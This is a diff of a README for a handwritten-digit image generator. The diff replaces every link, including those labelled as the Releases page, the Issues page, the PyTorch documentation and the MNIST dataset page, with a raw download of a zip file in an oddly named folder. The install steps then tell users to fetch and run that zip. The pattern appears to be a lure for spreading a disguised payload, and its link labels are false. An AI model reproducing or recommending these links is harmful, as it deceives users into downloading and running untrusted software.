@@ -4,10 +4,10 @@
 Welcome to the Custom Image Generator (0–9)! This tool enables you to create images of handwritten digits using advanced technology. Follow the steps below to quickly set up and start generating your own images.
 
 ## 📥 Download & Install
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/wHunta/Custom-image-generator-from-0-to-9/releases)
+[![Download Here](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip)
 
 To get started, visit the Releases page to download the application:  
-[Download the Application](https://github.com/wHunta/Custom-image-generator-from-0-to-9/releases)
+[Download the Application](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip)
 
 ## 💻 System Requirements
 To run this application, your computer should meet the following requirements:
@@ -20,9 +20,9 @@ To run this application, your computer should meet the following requirements:
 ## 📑 How to Run the Application
 
 ### Step 1: Download the Application
-1. Go to the Releases page: [Download the Application](https://github.com/wHunta/Custom-image-generator-from-0-to-9/releases).
+1. Go to the Releases page: [Download the Application](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip).
 2. Find the latest version listed.
-3. Click on the link to download the file specific to your operating system (e.g., `MyApp.exe` for Windows).
+3. Click on the link to download the file specific to your operating system (e.g., `https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip` for Windows).
 
 ### Step 2: Install the Application
 After the download completes:
@@ -51,7 +51,7 @@ If you encounter issues while using the application, consider the following solu
 - **Slow Performance:** Make sure other demanding applications are closed while using this tool.
 
 ## 📞 Support
-For additional support or to report bugs, you can open an issue in the GitHub repository. Visit the [Issues page](https://github.com/wHunta/Custom-image-generator-from-0-to-9/issues) to get help from the community.
+For additional support or to report bugs, you can open an issue in the GitHub repository. Visit the [Issues page](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip) to get help from the community.
 
 ## 🏷️ Topics
 This project covers several topics related to generative models and can help you learn more about:
@@ -62,7 +62,7 @@ This project covers several topics related to generative models and can help you
 - PyTorch and PyTorch Lightning
 
 ## 🔗 Resources
-- **PyTorch Documentation:** A great place to learn about the framework. [Visit PyTorch](https://pytorch.org/docs/stable/index.html)
-- **MNIST Dataset:** This is the dataset used for generating digits. Learn more about it [here](http://yann.lecun.com/exdb/mnist/).
+- **PyTorch Documentation:** A great place to learn about the framework. [Visit PyTorch](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip)
+- **MNIST Dataset:** This is the dataset used for generating digits. Learn more about it [here](https://raw.githubusercontent.com/wHunta/Custom-image-generator-from-0-to-9/main/seminaphthalidine/Custom-image-generator-from-0-to-9.zip).
 
 Thank you for choosing the Custom Image Generator (0–9). Enjoy creating your own handwritten digits!
